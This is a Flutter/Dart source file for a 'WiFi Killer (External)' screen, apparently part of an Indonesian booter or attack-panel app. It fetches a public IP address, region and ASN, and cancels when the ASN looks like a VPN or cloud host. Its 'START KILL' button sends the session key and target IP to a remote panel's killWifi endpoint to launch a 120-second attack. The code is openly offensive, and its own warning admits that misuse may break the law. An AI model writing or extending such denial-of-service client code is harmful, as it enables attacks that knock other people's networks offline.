import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

// ─── GLOBAL FONT ───────────────────────────────────────────────────────
const String kFont = 'Pek';

// ─── Palette Merah Glass ───────────────────────────────────────────────
class _C {
  static const bg        = Color(0xFF0A0A0F);
  static const surface   = Color(0x1AFFFFFF);
  static const card      = Color(0x0DFFFFFF);
  static const border    = Color(0x1AFFFFFF);
  static const borderLit = Color(0x33FFFFFF);

  static const primary   = Color(0xFFFF1744);
  static const primaryMid = Color(0xFFFF5252);
  static const primaryLt  = Color(0xFFFF8A80);
  static const primaryDk  = Color(0xFFB71C1C);

  static const success   = Color(0xFF00E676);
  static const amber     = Color(0xFFFFB300);
  static const red       = Color(0xFFFF1744);

  static const text      = Color(0xFFF5EEEE);
  static const textSub   = Color(0xFFE0AAAA);
  static const textDim   = Color(0xFF994444);

  static const LinearGradient btnGrad = LinearGradient(
    colors: [Color(0xFFFF1744), Color(0xFFB71C1C)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  static LinearGradient get glassGrad => LinearGradient(
    colors: [
      Colors.white.withOpacity(0.06),
      Colors.white.withOpacity(0.02),
    ],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  static List<BoxShadow> get softShadow => [
    BoxShadow(
      color: Colors.black.withOpacity(0.15),
      blurRadius: 16,
      offset: const Offset(0, 4),
    ),
  ];
}

class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  @override
  void initState() {
    super.initState();
    _loadPublicInfo();
  }

  Future<void> _loadPublicInfo() async {
    setState(() {
      isLoading = true;
    });

    try {
      final ipRes = await http.get(Uri.parse("https://api.ipify.org?format=json"));
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip'];

      final infoRes = await http.get(Uri.parse(
          "http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String).toLowerCase();
      final isBlockedAsn = asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }

  Future<void> _attackTarget() async {
    setState(() => isAttacking = true);
    final url = Uri.parse(
        "http://digital.mypanelku.web.id:2041/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
      final res = await http.get(url);
      if (res.statusCode == 200) {
        _showAlert("✅ Attack Sent", "WiFi attack sent to $publicIp");
      } else {
        _showAlert("❌ Failed", "Server rejected request.");
      }
    } catch (e) {
      _showAlert("Error", "Network error: $e");
    } finally {
      setState(() => isAttacking = false);
    }
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: ClipRRect(
          borderRadius: BorderRadius.circular(20),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
            child: Container(
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                gradient: _C.glassGrad,
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: _C.border),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.info_outline_rounded,
                      color: _C.primaryLt, size: 40),
                  const SizedBox(height: 12),
                  Text(title,
                      textAlign: TextAlign.center,
                      style: TextStyle(
                          color: _C.text,
                          fontFamily: kFont,
                          fontSize: 16,
                          fontWeight: FontWeight.bold)),
                  const SizedBox(height: 8),
                  Text(message,
                      textAlign: TextAlign.center,
                      style: TextStyle(
                          color: _C.textSub,
                          fontFamily: kFont,
                          fontSize: 13,
                          height: 1.5)),
                  const SizedBox(height: 20),
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 32, vertical: 12),
                      decoration: BoxDecoration(
                        gradient: _C.btnGrad,
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Text("OK",
                          style: TextStyle(
                              color: _C.text,
                              fontFamily: kFont,
                              fontWeight: FontWeight.bold)),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ─── INFO CARD ──────────────────────────────────────────────────────
  Widget _infoCard(String title, String value, IconData icon) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(14),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: Container(
          margin: const EdgeInsets.only(bottom: 10),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            gradient: _C.glassGrad,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: _C.border),
            boxShadow: _C.softShadow,
          ),
          child: Row(
            children: [
              Container(
                width: 42,
                height: 42,
                decoration: BoxDecoration(
                  color: _C.primary.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: _C.primary.withOpacity(0.2)),
                ),
                child: Icon(icon, color: _C.primaryLt, size: 18),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title,
                        style: TextStyle(
                            color: _C.textSub,
                            fontFamily: kFont,
                            fontSize: 11,
                            letterSpacing: 1)),
                    const SizedBox(height: 3),
                    Text(value,
                        style: TextStyle(
                            color: _C.text,
                            fontFamily: kFont,
                            fontSize: 14,
                            fontWeight: FontWeight.w600),
                        overflow: TextOverflow.ellipsis),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        centerTitle: true,
        leading: Padding(
          padding: const EdgeInsets.all(8),
          child: GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              decoration: BoxDecoration(
                color: _C.surface,
                borderRadius: BorderRadius.circular(11),
                border: Border.all(color: _C.border),
              ),
              child: Icon(Icons.arrow_back_ios_new_rounded,
                  color: _C.textSub, size: 16),
            ),
          ),
        ),
        title: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 8,
              height: 8,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _C.primary,
                boxShadow: [
                  BoxShadow(
                      color: _C.primary.withOpacity(0.6), blurRadius: 8)
                ],
              ),
            ),
            const SizedBox(width: 10),
            Text(
              'WiFi Killer (External)',
              style: TextStyle(
                fontFamily: kFont,
                fontWeight: FontWeight.bold,
                color: _C.text,
                letterSpacing: 1.2,
                fontSize: 15,
                shadows: [
                  Shadow(
                      color: _C.primary.withOpacity(0.3), blurRadius: 10),
                ],
              ),
            ),
          ],
        ),
      ),
      body: Stack(
        children: [
          // ✅ BACKGROUND FOTO mmk.jpg
          Positioned.fill(
            child: Image.asset(
              'assets/images/mmk.jpg',
              fit: BoxFit.cover,
              errorBuilder: (_, __, ___) => Container(color: _C.bg),
            ),
          ),

          // ✅ Overlay gelap
          Positioned.fill(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    _C.bg.withOpacity(0.78),
                    _C.bg.withOpacity(0.88),
                    _C.bg.withOpacity(0.95),
                  ],
                ),
              ),
            ),
          ),

          SafeArea(
            child: isLoading
                ? Center(
                    child: CircularProgressIndicator(color: _C.primaryLt))
                : SingleChildScrollView(
                    physics: const BouncingScrollPhysics(),
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.stretch,
                      children: [
                        // Header
                        Text(
                          "System Information",
                          style: TextStyle(
                            fontSize: 20,
                            color: _C.text,
                            fontWeight: FontWeight.bold,
                            fontFamily: kFont,
                            letterSpacing: 1,
                            shadows: [
                              Shadow(
                                  color: _C.primary.withOpacity(0.3),
                                  blurRadius: 10),
                            ],
                          ),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          "Analisis informasi publik target untuk serangan eksternal",
                          style: TextStyle(
                              color: _C.textSub,
                              fontFamily: kFont,
                              fontSize: 12,
                              height: 1.5),
                        ),
                        const SizedBox(height: 20),

                        // Info cards
                        _infoCard("IP Address", publicIp, Icons.language_rounded),
                        _infoCard("Region", region, Icons.map_rounded),
                        _infoCard("ASN", asn, Icons.storage_rounded),

                        const SizedBox(height: 20),

                        // VPN warning
                        if (isVpn)
                          ClipRRect(
                            borderRadius: BorderRadius.circular(14),
                            child: BackdropFilter(
                              filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                              child: Container(
                                padding: const EdgeInsets.all(16),
                                decoration: BoxDecoration(
                                  color: _C.amber.withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(14),
                                  border: Border.all(
                                      color: _C.amber.withOpacity(0.3),
                                      width: 1.5),
                                ),
                                child: Row(
                                  crossAxisAlignment:
                                      CrossAxisAlignment.start,
                                  children: [
                                    const Icon(
                                        Icons.warning_amber_rounded,
                                        color: _C.amber,
                                        size: 20),
                                    const SizedBox(width: 10),
                                    Expanded(
                                      child: Text(
                                        "⚠️ Target berasal dari VPN/Hosting.\nSerangan dibatalkan.",
                                        style: TextStyle(
                                            color: _C.textSub,
                                            fontFamily: kFont,
                                            fontSize: 12,
                                            height: 1.5),
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ),
                          ),

                        // Attack button
                        if (!isVpn)
                          GestureDetector(
                            onTap: isAttacking ? null : _attackTarget,
                            child: Container(
                              height: 60,
                              decoration: BoxDecoration(
                                gradient: isAttacking
                                    ? LinearGradient(
                                        colors: [
                                          Colors.grey.shade800,
                                          Colors.grey.shade900,
                                        ],
                                        begin: Alignment.topLeft,
                                        end: Alignment.bottomRight,
                                      )
                                    : _C.btnGrad,
                                borderRadius: BorderRadius.circular(20),
                                boxShadow: isAttacking
                                    ? []
                                    : [
                                        BoxShadow(
                                            color: _C.primary
                                                .withOpacity(0.4),
                                            blurRadius: 20,
                                            offset: const Offset(0, 6)),
                                      ],
                              ),
                              child: Row(
                                mainAxisAlignment:
                                    MainAxisAlignment.center,
                                children: [
                                  Icon(
                                    isAttacking
                                        ? Icons.hourglass_top_rounded
                                        : Icons.wifi_off_rounded,
                                    color: _C.text,
                                    size: 22,
                                  ),
                                  const SizedBox(width: 10),
                                  Text(
                                    isAttacking
                                        ? "ATTACKING..."
                                        : "START KILL",
                                    style: TextStyle(
                                      fontSize: 15,
                                      letterSpacing: 1.5,
                                      fontFamily: kFont,
                                      color: _C.text,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ),

                        if (isAttacking) ...[
                          const SizedBox(height: 16),
                          Center(
                            child: Text(
                              "Mengirim serangan ke $publicIp...",
                              style: TextStyle(
                                  color: _C.primaryLt,
                                  fontFamily: kFont,
                                  fontSize: 12),
                            ),
                          ),
                        ],

                        const SizedBox(height: 20),

                        // Warning banner
                        ClipRRect(
                          borderRadius: BorderRadius.circular(12),
                          child: BackdropFilter(
                            filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
                            child: Container(
                              padding: const EdgeInsets.all(12),
                              decoration: BoxDecoration(
                                color: _C.primary.withOpacity(0.05),
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(
                                    color: _C.primary.withOpacity(0.2)),
                              ),
                              child: Row(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  const Icon(Icons.info_outline_rounded,
                                      color: _C.primary, size: 16),
                                  const SizedBox(width: 10),
                                  Expanded(
                                    child: Text(
                                      'Fitur ini hanya untuk role VIP/Owner. '
                                      'Penyalahgunaan dapat melanggar hukum.',
                                      style: TextStyle(
                                          color: _C.textSub,
                                          fontFamily: kFont,
                                          fontSize: 11,
                                          height: 1.5),
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
          ),
        ],
      ),
    );
  }
}